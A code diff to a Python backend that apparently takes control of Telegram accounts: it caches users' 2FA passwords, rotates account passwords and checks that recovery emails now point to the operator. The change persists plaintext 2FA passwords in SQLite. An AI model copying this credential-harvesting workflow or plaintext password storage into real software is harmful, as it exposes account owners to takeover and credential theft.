@@ -44,7 +44,10 @@ from backend.core_engine.credentials_logger import (
 from backend.services.security_audit import SecurityAuditService, TransferMode
 from backend.models.database import (
     AuthStatus, DeliveryStatus, TransferMode as DBTransferMode,
-    add_account, get_account, update_account, log_auth_action
+    add_account, get_account, update_account, log_auth_action,
+    persistent_cache_set, persistent_cache_get, persistent_cache_clear,
+    persistent_cache_check_timeout, persistent_cache_remaining_time,
+    persistent_cache_cleanup_expired, SESSION_CACHE_TTL_SECONDS
 )
 from backend.api.webhook_routes import get_code_by_hash, email_codes_store
 from config import API_ID, API_HASH, EMAIL_DOMAIN
@@ -76,59 +79,54 @@ class DeliveryConfirmRequest(BaseModel):
     received: bool = True
 
 
-# ============== Session Cache (RAM) ==============
+# ============== Session Cache (RAM + SQLite Persistent) ==============
 
-# Cache for 2FA passwords and session start times
-# Format: {phone: {"2fa_password": str, "started_at": datetime, "telegram_id": int}}
-session_cache: Dict[str, Dict] = {}
+# In-memory layer for fast reads; SQLite layer for persistence across restarts.
+# Write-through: every write goes to both RAM and SQLite.
+# Read: RAM first → fallback to SQLite (and populate RAM).
+_ram_cache: Dict[str, Dict] = {}
 
-# Session timeout in seconds (30 minutes)
-SESSION_TIMEOUT_SECONDS = 30 * 60
-
-
-def cache_session_data(phone: str, **kwargs):
-    """Cache session data in RAM"""
-    if phone not in session_cache:
-        session_cache[phone] = {"started_at": datetime.utcnow()}
-    session_cache[phone].update(kwargs)
+SESSION_TIMEOUT_SECONDS = SESSION_CACHE_TTL_SECONDS  # 30 minutes (from database.py)
 
 
-def get_cached_data(phone: str, key: str = None):
-    """Get cached data for a phone"""
-    if phone not in session_cache:
-        return None
-    if key:
-        return session_cache[phone].get(key)
-    return session_cache[phone]
+async def cache_session_data(phone: str, **kwargs):
+    """Cache session data in RAM + persistent SQLite store."""
+    if phone not in _ram_cache:
+        _ram_cache[phone] = {"started_at": datetime.utcnow().isoformat()}
+    for k, v in kwargs.items():
+        _ram_cache[phone][k] = v.isoformat() if isinstance(v, datetime) else v
+    # Write-through to SQLite
+    await persistent_cache_set(phone, **kwargs)
 
 
-def clear_session_cache(phone: str):
-    """Clear cached data for a phone"""
-    if phone in session_cache:
-        del session_cache[phone]
+async def get_cached_data(phone: str, key: str = None):
+    """Get cached data — RAM first, fallback to SQLite."""
+    # Try RAM
+    if phone in _ram_cache:
+        if key:
+            return _ram_cache[phone].get(key)
+        return _ram_cache[phone]
+    # Fallback to SQLite (server may have restarted)
+    data = await persistent_cache_get(phone, key)
+    if data and not key:
+        _ram_cache[phone] = data  # Populate RAM
+    return data
 
 
-def check_session_timeout(phone: str) -> bool:
-    """Check if session has timed out (30 min limit)"""
-    data = get_cached_data(phone)
-    if not data or "started_at" not in data:
-        return False  # No session started
-    
-    started_at = data["started_at"]
-    elapsed = (datetime.utcnow() - started_at).total_seconds()
-    return elapsed > SESSION_TIMEOUT_SECONDS
+async def clear_session_cache(phone: str):
+    """Clear cached data from both RAM and SQLite."""
+    _ram_cache.pop(phone, None)
+    await persistent_cache_clear(phone)
 
 
-def get_session_remaining_time(phone: str) -> int:
-    """Get remaining time in seconds"""
-    data = get_cached_data(phone)
-    if not data or "started_at" not in data:
-        return SESSION_TIMEOUT_SECONDS
-    
-    started_at = data["started_at"]
-    elapsed = (datetime.utcnow() - started_at).total_seconds()
-    remaining = SESSION_TIMEOUT_SECONDS - elapsed
-    return max(0, int(remaining))
+async def check_session_timeout(phone: str) -> bool:
+    """Check if session has timed out (30 min limit)."""
+    return await persistent_cache_check_timeout(phone)
+
+
+async def get_session_remaining_time(phone: str) -> int:
+    """Get remaining time in seconds."""
+    return await persistent_cache_remaining_time(phone)
 
 
 # ============== Concurrency Locks ==============
@@ -248,7 +246,7 @@ async def _do_init_auth(request: InitAuthRequest, req: Request, phone: str):
             await log_auth_action(phone, "init_auth", "already_authenticated")
             
             # Start session timer
-            cache_session_data(phone, started_at=datetime.utcnow(), telegram_id=telegram_id)
+            await cache_session_data(phone, started_at=datetime.utcnow(), telegram_id=telegram_id)
             
             duration = time.time() - start_time
             response = {
@@ -275,7 +273,7 @@ async def _do_init_auth(request: InitAuthRequest, req: Request, phone: str):
             await log_auth_action(phone, "init_auth", "success")
             
             # Start session timer (30 min limit)
-            cache_session_data(phone, started_at=datetime.utcnow())
+            await cache_session_data(phone, started_at=datetime.utcnow())
             
             duration = time.time() - start_time
             response = {
@@ -412,7 +410,7 @@ async def _do_verify_auth(request: VerifyAuthRequest, req: Request, phone: str):
                 )
                 
                 # Cache 2FA password for later use in finalize
-                cache_session_data(phone, two_fa_password=request.password, telegram_id=telegram_id)
+                await cache_session_data(phone, two_fa_password=request.password, telegram_id=telegram_id)
                 
                 duration = time.time() - start_time
                 return {
@@ -480,7 +478,7 @@ async def audit_account(account_id: str, req: Request):
         
         # Try to pass known password for full recovery email check
         # Use cached 2FA password from verify step, or stored generated password
-        known_password = get_cached_data(phone, "two_fa_password") or account.generated_password
+        known_password = await get_cached_data(phone, "two_fa_password") or account.generated_password
         
         # Get security info (with password if available for full email check)
         security_info = await manager.get_security_info(phone, known_password=known_password)
@@ -586,7 +584,7 @@ async def finalize_account(account_id: str, request: FinalizeRequest, req: Reque
     
     try:
         # Check session timeout (30 min limit)
-        if check_session_timeout(phone):
+        if await check_session_timeout(phone):
             # Save session to backup before clearing
             manager = get_pyrogram()
             try:
@@ -599,7 +597,7 @@ async def finalize_account(account_id: str, request: FinalizeRequest, req: Reque
                     logger.warning(f"Session expired for {phone}, saved to backup")
             except:
                 pass
-            clear_session_cache(phone)
+            await clear_session_cache(phone)
             raise HTTPException(
                 status_code=408, 
                 detail="Session expired (30 minutes). Please start over. Session saved as backup."
@@ -619,7 +617,7 @@ async def finalize_account(account_id: str, request: FinalizeRequest, req: Reque
         new_password = generate_strong_password(24)
         
         # Get cached 2FA password (from verify step)
-        cached_2fa = get_cached_data(phone, "two_fa_password")
+        cached_2fa = await get_cached_data(phone, "two_fa_password")
         current_2fa_password = request.two_fa_password or cached_2fa
         
         target_email = account.target_email
@@ -883,7 +881,7 @@ async def finalize_account(account_id: str, request: FinalizeRequest, req: Reque
             await log_auth_action(phone, "finalize", "success")
             
             # Clear session cache after successful finalize
-            clear_session_cache(phone)
+            await clear_session_cache(phone)
             
             duration = time.time() - start_time
             
@@ -930,9 +928,9 @@ async def get_session_status(account_id: str):
     """
     phone = account_id
     
-    remaining = get_session_remaining_time(phone)
-    is_expired = check_session_timeout(phone)
-    cached_data = get_cached_data(phone)
+    remaining = await get_session_remaining_time(phone)
+    is_expired = await check_session_timeout(phone)
+    cached_data = await get_cached_data(phone)
     
     return {
         "account_id": phone,
@@ -1117,7 +1115,7 @@ async def confirm_email_changed(account_id: str):
     our_email = account.target_email or ""
     
     # Try to get known password for full email check
-    known_password = get_cached_data(phone, "two_fa_password") or account.generated_password
+    known_password = await get_cached_data(phone, "two_fa_password") or account.generated_password
     
     # Connect if needed
     connected = phone in manager.active_clients
